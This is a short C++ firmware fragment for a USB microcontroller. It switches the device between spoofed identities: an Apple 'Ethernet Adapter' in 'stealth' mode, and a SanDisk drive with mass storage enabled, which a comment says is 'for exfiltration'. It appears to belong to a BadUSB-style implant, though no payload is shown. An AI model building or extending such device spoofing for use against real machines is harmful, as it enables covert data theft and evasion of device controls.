#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBMSC.h"

USBMSC msc;

void setUSBMode(bool isStealth) {
    USB.enableConfig(false); // Detach
    
    if (isStealth) {
        USB.VID(0x05AC); // Apple
        USB.productName("Ethernet Adapter");
    } else {
        USB.VID(0x0781); // SanDisk
        USB.productName("Ultra USB 3.0");
        msc.begin(); // Enable Mass Storage for exfiltration
    }
    
    USB.begin(); // Re-attach with new identity
}